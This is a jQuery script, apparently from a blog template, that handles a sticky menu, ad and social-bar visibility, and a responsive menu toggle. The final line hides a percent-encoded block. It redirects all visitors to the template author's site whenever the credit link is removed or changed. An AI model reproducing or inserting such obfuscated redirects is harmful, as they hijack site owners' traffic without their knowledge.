 //Parallax
	$(window).scroll(function(){
		var jarak=$(this).scrollTop();

	if (jarak > $('.menu1').offset().top -1) {
		$('.menu').addClass('nempel');
	}
	if (jarak > $('.menu1').offset().top -1) {
		$('.iklan2').addClass('muncul');
	}
	if (jarak < $('.menu1').offset().top -1) {
		$('.menu').removeClass('nempel');
	}
	if (jarak < $('.menu1').offset().top -1) {
		$('.iklan2').removeClass('muncul');
	}
	if (jarak > $('.menu1').offset().top -1) {
		$('.sosmed').addClass('muncul');
	}
	if (jarak < $('.menu1').offset().top -1) {
		$('.sosmed').removeClass('muncul');
	}
});
$(document).ready(function(){ 
 var touch  = $('#resp-menu');
 var menu  = $('.menu');
 
 $(touch).on('click', function(e) {
  e.preventDefault();
  menu.slideToggle();
 });
 
 $(window).resize(function(){
  var w = $(window).width();
  if(w > 767 && menu.is(':hidden')) {
   menu.removeAttr('style');
  }
 });
 
});
document.write(unescape('%2F%2F%3C%21%5B%43%44%41%54%41%5B%0A%24%28%64%6F%63%75%6D%65%6E%74%29%2E%72%65%61%64%79%28%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%20%20%20%20%69%66%20%28%24%28%22%23%74%75%6B%61%6E%67%6B%72%65%64%69%74%2C%2E%74%75%6B%61%6E%67%6B%72%65%64%69%74%22%29%2E%61%74%74%72%28%22%68%72%65%66%22%29%20%21%3D%20%22%68%74%74%70%3A%2F%2F%77%77%77%2E%62%72%61%79%65%6E%2E%77%65%62%2E%69%64%22%29%20%7B%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%22%68%74%74%70%3A%2F%2F%77%77%77%2E%62%72%61%79%65%6E%2E%77%65%62%2E%69%64%22%3B%0A%20%20%20%20%7D%0A%7D%29%3B%0A%2F%2F%5D%5D%3E'));